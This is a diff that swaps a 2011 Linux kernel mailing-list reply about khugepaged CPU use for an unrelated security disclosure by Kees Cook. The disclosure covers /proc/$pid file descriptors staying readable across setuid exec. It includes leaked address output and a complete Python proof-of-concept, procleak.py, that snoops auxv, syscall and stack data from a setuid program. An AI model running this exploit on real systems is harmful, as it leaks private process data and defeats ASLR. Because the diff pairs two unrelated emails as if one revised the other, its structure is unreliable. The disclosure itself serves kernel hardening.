@@ -1,79 +1,133 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1755213Ab1BGXMe (ORCPT <rfc822;w@1wt.eu>);
-	Mon, 7 Feb 2011 18:12:34 -0500
-Received: from mx1.redhat.com ([209.132.183.28]:1026 "EHLO mx1.redhat.com"
+	id S1755129Ab1BGXOS (ORCPT <rfc822;w@1wt.eu>);
+	Mon, 7 Feb 2011 18:14:18 -0500
+Received: from smtp.outflux.net ([198.145.64.163]:39281 "EHLO smtp.outflux.net"
 	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1754899Ab1BGXMd (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 7 Feb 2011 18:12:33 -0500
-Date: Tue, 8 Feb 2011 00:12:28 +0100
-From: Andrea Arcangeli <aarcange@redhat.com>
-To: Michal Hocko <mhocko@suse.cz>
-Cc: LKML <linux-kernel@vger.kernel.org>, linux-mm@kvack.org
-Subject: Re: khugepaged eating 100%CPU
-Message-ID: <20110207231228.GI3347@random.random>
-References: <20110207210517.GA24837@tiehlicka.suse.cz>
- <20110207211601.GA25665@tiehlicka.suse.cz>
+	id S1755034Ab1BGXOR (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Mon, 7 Feb 2011 18:14:17 -0500
+Date: Mon, 7 Feb 2011 15:14:16 -0800
+From: Kees Cook <kees.cook@canonical.com>
+To: linux-kernel@vger.kernel.org
+Subject: [SECURITY] /proc/$pid/ leaks contents across setuid exec
+Message-ID: <20110207231416.GD1457@outflux.net>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-In-Reply-To: <20110207211601.GA25665@tiehlicka.suse.cz>
+Organization: Canonical
+X-HELO: www.outflux.net
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hello Michal,
+Hi,
 
-On Mon, Feb 07, 2011 at 10:16:01PM +0100, Michal Hocko wrote:
-> On Mon 07-02-11 22:06:54, Michal Hocko wrote:
-> > Hi Andrea,
-> > 
-> > I am currently running into an issue when khugepaged is running 100% on
-> > one of my CPUs for a long time (at least one hour as I am writing the
-> > email). The kernel is the clean 2.6.38-rc3 (i386) vanilla kernel.
-> > 
-> > I have tried to disable defrag but it didn't help (I haven't rebooted
-> > after setting the value). I am not sure what information is helpful and
-> > also not sure whether I am able to reproduce it after restart (it is the
-> > first time I can see this problem) so sorry for the poor report.
-> > 
-> > Here is some basic info which might be useful (config and sysrq+t are
-> > attached):
-> > =========
-> 
-> And I have just realized that I forgot about the daemon stack:
-> # cat /proc/573/stack 
-> [<c019c981>] shrink_zone+0x1b9/0x455
-> [<c019d462>] do_try_to_free_pages+0x9d/0x301
-> [<c019d803>] try_to_free_pages+0xb3/0x104
-> [<c01966d7>] __alloc_pages_nodemask+0x358/0x589
-> [<c01bf314>] khugepaged+0x13f/0xc60
-> [<c014c301>] kthread+0x67/0x6c
-> [<c0102db6>] kernel_thread_helper+0x6/0x10
-> [<ffffffff>] 0xffffffff
+This came to my attention via a post[1] to full-disclosure, but I don't
+think anyone actually brought it up to lkml. Local attackers are able to
+bypass DAC permissions in /proc/$pid/ when they can exec a setuid program.
+As long as the fd is open before the exec, its contents remain readable
+after the exec, even to a setuid program. Here is auxv being scanned for
+values that should be private, due to ASLR:
 
-It would be great to know if __alloc_pages_nodemask returned or if it
-was calling it in a loop.
+$ ./procleak.py auxv /usr/bin/passwd
+AT_BASE:   0x7f761076f000
+AT_RANDOM: 0x7fff23697969
+Changing password for kees.
+(current) UNIX password: 
 
-When __alloc_pages_nodemask fails in collapse_huge_page, hpage is set
-to ERR_PTR(-ENOMEM), then khugepaged_scan_pmd returns 1, then
-khugepaged_scan_mm_slot goto breakouterloop_mmap_sem and return
-progress, then the khugepaged_do_scan main loop should notice that
-IS_ERR(*hpage) is set and break out of the loop and return void, then
-khugepaged_loop should notice that IS_ERR(hpage) is set and it should
-throttle for alloc_sleep_millisecs inside khugepaged_alloc_sleep
-before setting hpage to NULL and trying again to allocate. I wonder
-what could be going wrong in khugepaged.. I wonder if it's a bug inside
-__alloc_pages_nodemask and not a khugepaged issue. Best would be if
-you run SYSRQ+l several times (/proc/*/stack don't seem to be the best
-for running tasks even if it should be accurate enough already, but if
-you run it often and with sysrq+l it'll be more clear what is
-running).
+Note that AT_RANDOM is the _location_ of AT_RANDOM, not the value itself,
+but this therefore leaks stack location, and AT_BASE leaks the mmap
+position of ld:
 
-I hope you can reproduce, if it's an allocator issue you should notice
-it again by keeping the same workload on that same system. I doubt I
-can reproduce at the moment as I don't know what's going on to
-simulate your load.
+7f761076f000-7f761078f000 r-xp 00000000 fc:00 1051386 /lib/ld-2.12.2.so
+...
+7fff23678000-7fff23699000 rw-p 00000000 00:00 0 [stack]
 
-Thanks a lot,
-Andrea
+Additionally, snooping on the kernel stack, the syscall parameters, and
+even changing oom_adj is possible. Luckily, maps, mem, etc are already
+protected by may_ptrace(). The attached tool can demonstrate the snooping,
+just specify which /proc/$pid files you want, and the setuid program to
+launch. For example:
+
+$ ./procleak.py auxv,syscall /usr/bin/passwd
+running
+AT_BASE:   0x7f2828bde000
+AT_RANDOM: 0x7fff80bde7c9
+Changing password for kees.
+(current) UNIX password: 0 0x0 0x7fff80bdda90 0x1ff 0x7fff80bdd580 0x7f2828dc57c0 0x7f28287cec1d 0x7fff80bdd088 0x7f28282fe6c0
+
+There needs to be some way to break the connection to these files across
+the setuid exec, or perform some sort of revalidation of permissions. (Maybe
+check dumpable?)
+
+-Kees
+
+[1] http://seclists.org/fulldisclosure/2011/Jan/421
+
+---
+#!/usr/bin/python
+# Demonstrates DAC bypass on /proc/$pid file descriptors across setuid exec.
+# Author: Kees Cook <kees@ubuntu.com>
+# License: GPLv2
+# Usage: ./procleak.py FILES,TO,SNOOP PROGRAM-TO-RUN
+import os, sys, time, struct
+
+target = os.getpid()
+snoop = ['auxv', 'syscall', 'stack']
+
+args = []
+if len(sys.argv)>1:
+    args = sys.argv[1:]
+    snoop = args[0].split(',')
+    args = args[1:]
+
+def dump_auxv(blob):
+    if len(blob) == 0:
+        return
+    auxv = struct.unpack('@%dL' % (len(blob)/len(struct.pack('@L',0))), blob)
+    while auxv[0] != 0:
+        if auxv[0] == 7:
+            print "AT_BASE:   0x%x" % (auxv[1])
+        if auxv[0] == 25:
+            print "AT_RANDOM: 0x%x" % (auxv[1])
+        auxv = auxv[2:]
+
+pid = os.fork()
+if pid == 0:
+    # Child
+    os.setsid()
+    sys.stdin.close()
+
+    files = dict()
+    last = dict()
+    for name in snoop:
+        files[name] = file('/proc/%d/%s' % (target, name))
+        # Ignore initial read, since it's from the existing parent
+        last[name] = files[name].read()
+    while True:
+        try:
+            for name in snoop:
+                files[name].seek(0)
+                saw = files[name].read()
+                if saw != last[name]:
+                    if name == 'auxv':
+                        dump_auxv(saw)
+                    else:
+                        print saw
+                    last[name] = saw
+        except Exception, o:
+            if o.errno == 3:
+                # Target quit
+                sys.exit(0)
+
+cmd = ['/usr/bin/passwd']
+if len(args) > 0:
+    cmd = args
+time.sleep(1)
+os.execv(cmd[0],cmd)
+
+
+
+-- 
+Kees Cook
+Ubuntu Security Team
